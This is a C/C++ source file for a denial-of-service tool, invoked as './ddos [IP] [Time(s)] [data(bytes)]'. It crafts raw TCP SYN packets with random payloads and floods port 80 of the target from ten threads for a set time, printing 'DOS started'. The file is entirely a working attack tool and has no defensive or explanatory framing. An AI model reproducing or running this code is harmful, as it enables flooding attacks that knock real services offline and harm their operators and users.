#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <bits/stdc++.h>
using namespace std;
 
const int MAX_SIZE = 26;
 
string printstring(int n)
{
char letters[MAX_SIZE] = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q',
'r','s','t','u','v','w','x',
'y','z'};
string ran = "";
for (int i=0;i<n;i++) 
ran=ran + letters[rand() % MAX_SIZE];
return ran;
}

int get_local_ip ( char * buffer)
{
        int sock = socket ( AF_INET, SOCK_DGRAM, 0);

        const char* kGoogleDnsIp = "8.8.8.8";
        int dns_port = 53;

        struct sockaddr_in serv;

        memset( &serv, 0, sizeof(serv) );
        serv.sin_family = AF_INET;
        serv.sin_addr.s_addr = inet_addr(kGoogleDnsIp);
        serv.sin_port = htons( dns_port );

        int err = connect( sock , (const struct sockaddr*) &serv , sizeof(serv) );

        struct sockaddr_in name;
        socklen_t namelen = sizeof(name);
        err = getsockname(sock, (struct sockaddr*) &name, &namelen);

        const char *p = inet_ntop(AF_INET, &name.sin_addr, buffer, 100);

        close(sock);
}
struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};
struct args {
    int a;
    const char* b;
        int c;
        const struct sockaddr *d;
        int e;
};
struct in_addr dest_ip;
void* flooder(void *argvvs){
        struct args *argvs = (struct args *)argvvs;
        while(true)
        {
                if ( sendto (argvs->a, argvs->b , argvs->c , 0 , argvs->d, argvs->e) < 0)
                {
                        continue;
                }
        }
}

unsigned short csum(unsigned short *ptr,int nbytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}

int main (int argc, char** argv)
{
	if(argc==1){
	  printf("./ddos [IP] [Time(s)] [data(bytes)]\n");
	  return 0;
	}
	//Create a raw socket
	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
	
	if(s == -1)
	{
		perror("Failed to create socket. Are you running as root?");
		exit(1);
	}
	
	char datagram[4096] , source_ip[20] , *data , *pseudogram;
	memset (datagram, 0, 4096);
	struct iphdr *iph = (struct iphdr *) datagram;
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
	struct sockaddr_in sin;
	struct pseudo_header psh;
	data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
  srand(time(NULL));
  char* char_arr;
  string str_obj=printstring(atoi(argv[3]));
  char_arr = &str_obj[0];
	strcpy(data , char_arr);
	
  get_local_ip( source_ip );
	sin.sin_family = AF_INET;
	sin.sin_port = htons(80);
	sin.sin_addr.s_addr = inet_addr (argv[1]);
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
	iph->id = htonl (54321);
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;
	iph->saddr = inet_addr ( source_ip );
	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);
	tcph->source = htons (1234);
	tcph->dest = htons (80);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5;
	tcph->fin=0;
	tcph->syn=1;
	tcph->rst=0;
	tcph->psh=0;
	tcph->ack=0;
	tcph->urg=0;
	tcph->window = htons (5840);
	tcph->check = 0;
	tcph->urg_ptr = 0;

	psh.source_address = inet_addr( source_ip );
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );
	
	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
	pseudogram = malloc(psize);
	
	memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
	
	tcph->check = csum( (unsigned short*) pseudogram , psize);

	int one = 1;
	const int *val = &one;
	
	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
	{
		perror("Error setting IP_HDRINCL");
		exit(0);
	}
	struct args argvs;
        argvs.a=s;
        argvs.b=datagram;
        argvs.c=iph->tot_len;
        argvs.d=(struct sockaddr *) &sin;
        argvs.e=sizeof (sin);
	for(int i=0;i<10;i++){
          pthread_t sniffer_thread;
					
          if( pthread_create( &sniffer_thread , NULL ,  &flooder , (void *)&argvs) < 0)
          {
                  printf ("Could not create sniffer thread. Error number : %d . Error message : %s \n" , errno , strerror(errno));
                  exit(0);
          }
          printf("Thread made\n");
  }
  printf("DOS started\n");
  sleep(atoi(argv[2]));
	return 0;
}
